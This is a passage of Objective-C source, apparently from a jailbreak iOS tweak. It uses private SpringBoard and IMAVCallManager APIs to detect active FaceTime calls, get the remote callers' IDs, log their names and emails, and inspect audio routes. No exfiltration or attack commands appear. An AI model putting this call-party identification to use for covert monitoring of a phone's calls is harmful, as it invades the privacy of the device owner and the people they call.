    return (inFaceTime);
}

+ (NSArray *) currentFaceTimeCallRemoteUserIds {
    NSMutableArray *currentRemoteUserIds = [NSMutableArray array];
    NSString *currentRemoteUserId = nil;
    Class $SBConferenceManager = objc_getClass("SBConferenceManager");
    SBConferenceManager *sbConferenceManager = [$SBConferenceManager sharedInstance];
    
    // Video FaceTime (video call can have only one active at a time)
    if ([sbConferenceManager respondsToSelector:@selector(currentCallRemoteUserId)]) {
        currentRemoteUserId = [sbConferenceManager currentCallRemoteUserId] ? [sbConferenceManager currentCallRemoteUserId] : @""; // iOS 5,6,7,8
    } else { // iOS 9
        IMAVChatProxy *currentFaceTimeCall = [sbConferenceManager currentFaceTimeCall];
        if (currentFaceTimeCall) {
            IMHandle *otherHandle = [currentFaceTimeCall otherIMHandle]; // Replacement for currentCallRemoteUserId from iOS 5,6,7,8
            currentRemoteUserId = [otherHandle ID];
        }
        else {
            currentRemoteUserId = @"";
        }
    }
    
    // Audio FaceTime (audio call can have two active at a time (one connected, one on hold, cannot conference)
    if (![currentRemoteUserId length]) {
        Class $IMAVCallManager = objc_getClass("IMAVCallManager");
        IMAVCallManager *imavCallManager = [$IMAVCallManager sharedInstance];
        /*
        // All methods return null for FaceTime audio
        if ([imavCallManager respondsToSelector:@selector(_activeAudioCall)]) { // iOS 7,8
            id activeAudioCall = [imavCallManager _activeAudioCall];
            APPLOGVERBOSE(@"activeAudioCall = %@", activeAudioCall);
        }
        if ([imavCallManager respondsToSelector:@selector(_activeFaceTimeCall)]) { // iOS 7,8
            id activeFaceTimeCall = [imavCallManager _activeFaceTimeCall];
            APPLOGVERBOSE(@"activeFaceTimeCall = %@", activeFaceTimeCall);
        }
        if ([imavCallManager respondsToSelector:@selector(_mutableFTCalls)]) { // iOS 7,8
            id mutableFTCalls = [imavCallManager _mutableFTCalls];
            APPLOGVERBOSE(@"mutableFTCalls = %@", mutableFTCalls);
        }
        APPLOGVERBOSE(@"_FTCalls    = %@", [imavCallManager _FTCalls]); // iOS 5,6,7,8
        */
        
        //APPLOGVERBOSE(@"calls       = %@", [imavCallManager calls]); // iOS 5,6,7,8
        for (id call in [imavCallManager calls]) {
            APPLOGVERBOSE(@"call = %@, %@", [call class], call); // IMAVChatProxy, xxx
            Class $IMAVChatProxy = objc_getClass("IMAVChatProxy");
            if ([call isKindOfClass:$IMAVChatProxy]) {
                IMAVChatProxy *imavChatProxy = call;
                IMHandle *imHandle = [imavChatProxy otherIMHandle];
                currentRemoteUserId = [imHandle displayID];
                APPLOGVERBOSE(@"ID              = %@", [imHandle ID]);
                APPLOGVERBOSE(@"displayID       = %@", [imHandle displayID]);
                APPLOGVERBOSE(@"normalizedID    = %@", [imHandle normalizedID]);
                APPLOGVERBOSE(@"name            = %@", [imHandle name]);
                APPLOGVERBOSE(@"nameAndEmail    = %@", [imHandle nameAndEmail]);
                APPLOGVERBOSE(@"nameAndID       = %@", [imHandle nameAndID]);
                APPLOGVERBOSE(@"fullName        = %@", [imHandle fullName]);
                APPLOGVERBOSE(@"lastName        = %@", [imHandle lastName]);
                APPLOGVERBOSE(@"firstName       = %@", [imHandle firstName]);
                APPLOGVERBOSE(@"nickname        = %@", [imHandle nickname]);
                APPLOGVERBOSE(@"email           = %@", [imHandle email]);
                APPLOGVERBOSE(@"emails          = %@", [imHandle emails]);
                APPLOGVERBOSE(@"accountTypeName = %@", [imHandle accountTypeName]);
                [currentRemoteUserIds addObject:currentRemoteUserId];
            }
        }
    } else {
        [currentRemoteUserIds addObject:currentRemoteUserId];
    }
    APPLOGVERBOSE(@"currentRemoteUserIds = %@", currentRemoteUserIds);
    return (currentRemoteUserIds);
}

+ (BOOL) hasActiveFaceTimeCall {
    BOOL hasActiveFaceTimeCall = NO;
    Class $IMAVCallManager = objc_getClass("IMAVCallManager");
    IMAVCallManager *imavCallManager = [$IMAVCallManager sharedInstance];
    hasActiveFaceTimeCall = [imavCallManager _hasActiveFaceTimeCall]; // iOS 5,6,7,8
    if (!hasActiveFaceTimeCall) {
        if ([imavCallManager respondsToSelector:@selector(_hasActiveAudioCall)]) {
            hasActiveFaceTimeCall = [imavCallManager _hasActiveAudioCall]; // iOS 7,8
        }
    }
    APPLOGVERBOSE(@"$IMAVCallManager = %@, hasActiveFaceTimeCall = %d", $IMAVCallManager, hasActiveFaceTimeCall);
    return (hasActiveFaceTimeCall);
}

+ (void) debugAudioRoute {
    id adController = nil;
    Class $AudioDeviceController = objc_getClass("AudioDeviceController");
    Class $MPAudioDeviceController = objc_getClass("MPAudioDeviceController");
    if ($AudioDeviceController) { // Below iOS 8
        adController = [[$AudioDeviceController alloc] init];
    } else { // iOS 8
        adController = [[$MPAudioDeviceController alloc] init];
    }
    // No this method in iOS 8
    if ([adController respondsToSelector:@selector(setAVController:)]) {
        AVController *avController = [[AVController alloc] init];
        [adController setAVController:avController];
        [avController release];
    }
    //[adController pickSpeakerRoute];
    APPLOGVERBOSE(@"$AudioDeviceController      = %@", $AudioDeviceController);
    APPLOGVERBOSE(@"$MPAudioDeviceController    = %@", $MPAudioDeviceController);
    APPLOGVERBOSE(@"_pickedRout     = %@", [adController _pickedRoute]);
    APPLOGVERBOSE(@"_pickableRoutes = %@", [adController _pickableRoutes]);
    [adController release];
}

- (id) init {
	if ((self = [super init])) {
	}
	return (self);
}

- (void) dealloc {
	[super dealloc];
}

@end
